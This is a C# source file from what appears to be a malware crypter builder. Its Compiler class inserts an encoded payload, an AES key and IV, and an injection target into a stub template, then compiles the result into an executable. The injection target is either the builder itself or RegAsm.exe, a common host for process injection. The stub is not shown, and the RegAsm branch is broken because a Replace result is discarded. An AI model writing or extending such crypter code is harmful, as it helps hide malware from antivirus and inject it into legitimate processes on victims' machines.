using Crypter.Properties;
using Microsoft.CSharp;
using System;
using System.CodeDom.Compiler;
using System.Collections.Generic;
using System.IO;
using System.Runtime.InteropServices;
using System.Windows.Forms;

namespace Crypter.Tools
{
    internal class Compiler
    {
        private byte[] Key;
        private byte[] IV;
        private string base64;
        private string Injection;
        private string Stub = Resources.Stub;
        public Compiler(string base64, string key, string iv, string injection) {
            this.Key = Convert.FromBase64String(key);
            this.IV = Convert.FromBase64String(iv);
            this.Injection = injection;
            this.base64 = base64;
            SetSetting();
        }
        public void SetSetting()
        {
            try
            {
                Stub = Stub.Replace("%KEY%", Convert.ToBase64String(Key));
                Stub = Stub.Replace("%IV%", Convert.ToBase64String(IV));
                Stub = Stub.Replace("%BASE64%", base64);

                if (Injection == "Itself")
                {
                    Injection = "Application.ExecutablePath";
                }
                else
                {
                    string tmpInjection = Path.Combine(RuntimeEnvironment.GetRuntimeDirectory(), "RegAsm.exe");
                    Injection.Replace("\\", "\\\\");
                }
                Stub = Stub.Replace("%INJECTION%", Injection);
            }
            catch (Exception ex)
            {

                Console.WriteLine(ex.Message);
            }
        }
        public void Compile()
        {
            try
            {
                string[] referencedAsm = new string[]
                {
                    "System.dll",
                    "System.IO.dll",
                    "System.Runtime.InteropServices.dll",
                    "Mscorlib.dll",
                    "System.Core.dll"
                };
                Dictionary<string, string> providerOptions = new Dictionary<string, string>()
                {
                    {
                        "CompilerVersion",
                        "v4.0"
                    }
                };
                var compileOptions = "/target:exe /platform:x86 /optimize+";
                using (CSharpCodeProvider chCodeProvide = new CSharpCodeProvider(providerOptions))
                {
                    CompilerParameters compileParam = new CompilerParameters(referencedAsm) 
                    {
                        GenerateExecutable = true,
                        OutputAssembly = "test.exe",
                        CompilerOptions = compileOptions,
                        TreatWarningsAsErrors = true,
                    };
                    CompilerResults compilerResults = chCodeProvide.CompileAssemblyFromSource(compileParam, Stub);
                    if (compilerResults.Errors.Count > 0) 
                    {
                        foreach (CompilerError compilerError in compilerResults.Errors)
                        {
                            Console.WriteLine(compilerError);
                        }
                    }
                    else
                    {
                        MessageBox.Show("File has been complied!");
                        Console.WriteLine("File has been complied!");
                    }
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine(ex.Message);
            }
        }
    }
}
